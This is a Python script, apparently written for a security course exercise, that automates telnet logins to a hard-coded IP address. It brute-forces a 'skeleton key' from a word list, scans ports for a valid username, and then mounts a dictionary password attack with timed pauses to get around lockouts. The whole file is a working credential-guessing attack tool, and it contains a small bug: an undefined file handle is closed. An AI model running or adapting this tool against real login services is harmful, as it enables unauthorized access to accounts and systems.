#!/usr/bin/python

from __future__ import print_function
import pexpect
import re
import os
import io
import sys
import time

ports = ['5071', '5103', '5123', '5264', '5292', '5338', '5357', '5461', '5541', '5743', '5769', '5784', '5878', '5882', '5897', '5966', '6033', '6034', '6051', '6192', '6291', '6308', '6367', '6428', '6448', '6489', '6585', '6610', '6616', '6652', '6762', '6842', '6942', '6978', '7011', '7029', '7041', '7068', '7138', '7328', '7510', '7694', '7765', '7819', '7829', '7919', '7984', '7992', '8009', '8147', '8152', '8212', '8229', '8248', '8314', '8392', '8441', '8487', '8500', '8511', '8648', '8659', '8665', '8751', '8757', '8763', '8831', '8849', '8914', '8933', '8961', '8966', '9011', '9105', '9111', '9152', '9274', '9392', '9526', '9589', '9631', '9714', '9779', '9890', '9936', '9999']

def setup_dir():
    if not os.path.exists(".tmp/"):
        os.mkdir(".tmp/")


# code modified from 
#     https://stackoverflow.com/questions/1877999/delete-final-line-in-file-with-python
# by user Saqib
def reverse_pop(fname, num_of_passwords):
    # file = open(fname, "r+", encoding = "utf-8")
    file = open(fname, "r+")

    #Move the pointer (similar to a cursor in a text editor) to the end of the file. 
    file.seek(0, os.SEEK_END)

    #This code means the following code skips the very last character in the file - 
    #i.e. in the case the last line is null we delete the last line 
    #and the penultimate one
    pos = file.tell()

    #Read each character in the file one at a time from the penultimate 
    #character going backwards, searching for a newline character
    #If we find a new line, exit the search
    passwords = []
    while num_of_passwords > 0:
        password = ""
        while pos > 0:
            char = file.read(1)
            if char == "\n":
                break
            password = "".join([str(char), password])
            pos -= 1
            file.seek(pos, os.SEEK_SET)

        if password != "\n" and password != "":
            passwords.append(password)
            num_of_passwords -= 1 

        if pos > 0:
            file.seek(pos, os.SEEK_SET)
            file.truncate()
        else:
            break


    #So long as we're not at the start of the file, delete all the characters ahead of this position
    

    file.close()
    return passwords


def expect_not(child, line, f_out):
    try:
        index = child.expect([line,])
        if index == 0:
            f_out.write(u"FAIL\n")
            child.close()
    except pexpect.exceptions.EOF as e:
        child.close()
        raise e
    except pexpect.exceptions.TIMEOUT:
        index = child.expect([re.compile(r"[a-zA-Z0-9]*"), pexpect.exceptions.EOF, pexpect.exceptions.TIMEOUT], timeout=0.1)
        if index == 0:
            f_out.write(u"SUCCESS\n")
            child.close()
            return True
        elif index == 1:
            f_out.write(u"MATCH BUT FAIL WITH EOF\n")
            child.close()
        elif index == 2:
            f_out.write(u"MATCH BUT FAIL WITH TIMEOUT\n")
            child.close()
    return False


def mount_dictionary_attack(passwords_fname, skeleton_key, username, port):
    f_out = io.open(".tmp/dictionary.out","w")
    while True:
        passwords = reverse_pop(passwords_fname, 3)
        for password in passwords:
            if password == '':
                return None
            f_out.write(u'Testing password on 128.114.59.215:' + str(port) + '\n    SKELETON KEY: ' + skeleton_key + '\n    USERNAME    : ' + username + '\n    PASSWORD    : ' + password + '\n    STATUS      : ')
            
            child = pexpect.spawn("telnet 128.114.59.215 " + str(port), timeout=0.1)


            child.sendline(skeleton_key)


            try:
                child.expect("Username: ", timeout=0.1)
            except pexpect.exceptions.EOF:
                f_out.write(u"EOF EXPECTING USERNAME \n")
                child.close()
                f_out.flush()
                continue
            except pexpect.exceptions.TIMEOUT:
                f_out.write(u"TIMEOUT EXPECTING USERNAME \n")
                child.close()
                f_out.flush()
                continue

            # if skeleton_key accepted, 
            #  send username to the Username:
            child.sendline(username)


            child.sendline(password)

            try:
                if expect_not(child,"Incorrect password, goodbye.", f_out):
                    return password
            except pexpect.exceptions.EOF:
                f_out.write("    RETRY PASSWORD \n")
                passwords.append(password)
                f_out.flush()
                time.sleep(600)

            f_out.flush()
        
        if len(passwords) < 3:
            return None


        for j in range(1,11):
            time.sleep(60)
            f_out.write(unicode(str(j*60) + " seconds\n", "utf-8"))
            f_out.flush()


def find_designated_port(skeleton_key, username, ports, fast=True):
    f_out = io.open(".tmp/port.out","w")
    for i in ports:
        f_out.write(u'Testing port on 128.114.59.215:' + str(i))
        f_out.write(u"\n    SKELETON KEY : " + skeleton_key + "\n    USERNAME     : " + username + "\n    STATUS       : ")
        
        child = pexpect.spawn("telnet 128.114.59.215 " + str(i), timeout=0.1)


        child.sendline(skeleton_key)
        # Try to send username after skeleton key
        # if port is broken or down, timeout is set to 5,
        # close child and move on
        try:
            child.expect("Username: ", timeout=0.1)
        except pexpect.exceptions.EOF:
            f_out.write(u"EOF EXPECTING USERNAME \n")
            child.close()
            f_out.flush()
            continue
        except pexpect.exceptions.TIMEOUT:
            f_out.write(u"TIMEOUT EXPECTING USERNAME \n")
            child.close()
            f_out.flush()
            continue


        # if skeleton_key accepted, 
        #  send username to the Username:
        child.sendline(username)

        try:
            val = expect_not(child, "Invalid user, goodbye.", f_out)
            if val and fast:
                f_out.flush()
                return i
            elif val:
                port = i
        except pexpect.exceptions.EOF:
            f_out.write(u"EOF SENDING USERNAME \n")
            child.close()
            f_out.flush()
            continue

        f_out.flush()

        
    return port


def find_skeleton(port, fast=True):
    f_in = io.open("skeletonKeys.txt", "r")
    f_out = io.open(".tmp/skeleton.out","w")

    for line in f_in.readlines():
        f_out.write(u'Testing skeleton key on 128.114.59.215:' + str(port))
        f_out.write(u"\n    SKELETON KEY : " + str(line).strip(' \t\r\n') + "\n    STATUS       : ")

        child = pexpect.spawn("telnet 128.114.59.215 " + str(port), timeout=0.1)

        child.sendline(str(str(line).strip(' \t\r\n')))

        val = expect_not(child,"Connection closed by foreign host.",f_out)
        if val and fast:
            f_out.flush()
            return str(line).strip(' \t\r\n')
        elif val:
            key = str(line).strip(' \t\r\n')

        f_out.flush()

    f.close()
    return key


if __name__ == "__main__":

    setup_dir()
    print("Attempting to find skeleton key....",end='')
    key = find_skeleton(ports[0])
    if key is not None:
        print("found")
        print("=================================================")
        print(key)
        print("=================================================")
    else:
        print("not found")
        exit(1)

    print("Attempting to designated port....",end='')
    my_port = find_designated_port(key, "dthurau", ports)
    if my_port is not None:
        print("found")
        print("=================================================")
        print(my_port)
        print("=================================================")
    else:
        print("not found")
        exit(1)

    print("Attempting to guess password....",end='')
    password = mount_dictionary_attack("passwords.txt",key,"dthurau",my_port)

    if password is not None:
        print("found")
        print("=================================================")
        print(password)
        print("=================================================")
    else:
        print("not found")
        exit(1)